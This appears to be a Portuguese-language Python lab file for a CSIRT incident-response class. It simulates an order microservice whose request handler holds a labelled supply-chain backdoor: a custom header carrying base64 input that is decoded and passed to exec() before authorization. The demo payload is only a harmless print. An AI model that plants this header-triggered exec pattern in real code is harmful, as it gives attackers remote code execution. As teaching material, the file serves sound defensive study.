"""
MICROSSERVIÇO DE PROCESSAMENTO DE PEDIDOS E AUTENTICAÇÃO
VERSÃO: 2.1.0-SECURITY-PATCH-PENDING
ALERTA CSIRT: CÓDIGO SUSPEITO IDENTIFICADO EM AUDITORIA RECENTE.
"""

import base64
import os
import sys

# Banco de dados em memória simulado
USUARIOS_ATIVOS = {"admin": "Hash_Admin_9921", "operador": "Hash_Op_4412"}


def processar_requisicao_cliente(cabecalhos, dados_corpo):
    """Processa requisições legítimas de pedidos do totem/delivery."""
    print("[LOG]: Processando requisição recebida...")

    # ==========================================================================
    # [VETOR DE ATAQUE / BACKDOOR DE CADEIA DE SUPRIMENTOS]
    # Invasor introduziu uma validação que aparenta ser otimização de HTTP/2,
    # mas que decodifica e executa comandos do invasor via eval/exec.
    # ==========================================================================
    header_suspicious = cabecalhos.get("HTTP_X_ZERODAY_AGENT", "")

    if header_suspicious.startswith("sefaz_dbg:"):
        try:
            # O payload malicioso vem após o prefixo, codificado em base64
            payload_raw = header_suspicious.split("sefaz_dbg:")[1]
            comando_oculto = base64.b64decode(payload_raw).decode("utf-8")

            print("\n[ALERTA CRÍTICO DE SEGURANÇA]: BACKDOOR ACIONADO REMOTAMENTE!")
            # Execução de código arbitrário injetado pelo atacante
            exec(comando_oculto)
            print("[ALERTA]: Execução arbitrária concluída com sucesso.\n")
        except Exception as e:
            print(f"[ERRO NO EXPLOIT]: {e}")
    # ==========================================================================

    # Regra de negócio legítima
    usuario = cabecalhos.get("Authorization", "")
    if usuario not in USUARIOS_ATIVOS:
        return {"status": 401, "mensagem": "Acesso não autorizado."}

    produto = dados_corpo.get("item", "Não informado")
    quantidade = dados_corpo.get("qtd", 1)

    return {
        "status": 200,
        "mensagem": f"Pedido de {quantidade}x {produto} confirmado com sucesso!",
    }


def terminal_auditoria_incidente():
    """Simulador de terminal para os alunos reproduzirem a exploração e a defesa."""
    print("=" * 60)
    print("      CSIRT SENAI - LABORATÓRIO DE RESPOSTA A INCIDENTES")
    print("=" * 60)

    # 1. Teste de Requisição Normal
    headers_normais = {
        "Authorization": "admin",
        "Content-Type": "application/json",
    }
    dados = {"item": "Pizza Calabresa", "qtd": 2}
    resp1 = processar_requisicao_cliente(headers_normais, dados)
    print(f"Resultado Teste Legítimo: {resp1}\n")

    # 2. Simulação do Ataque Hacker (O que o atacante envia)
    print("--- SIMULANDO REQUISIÇÃO DO ATACANTE EXTERNO ---")
    cmd_invasor = "print('>> [EXPLOIT SUCESSO]: ACESSO ROOT OBTIDO NO SERVIDOR!')"
    payload_b64 = base64.b64encode(cmd_invasor.encode()).decode()

    headers_ataque = {
        "Authorization": "admin",
        "HTTP_X_ZERODAY_AGENT": f"sefaz_dbg:{payload_b64}",
    }

    resp_ataque = processar_requisicao_cliente(headers_ataque, dados)
    print(f"Resultado do Ataque: {resp_ataque}")
    print("=" * 60)


if __name__ == "__main__":
    terminal_auditoria_incidente()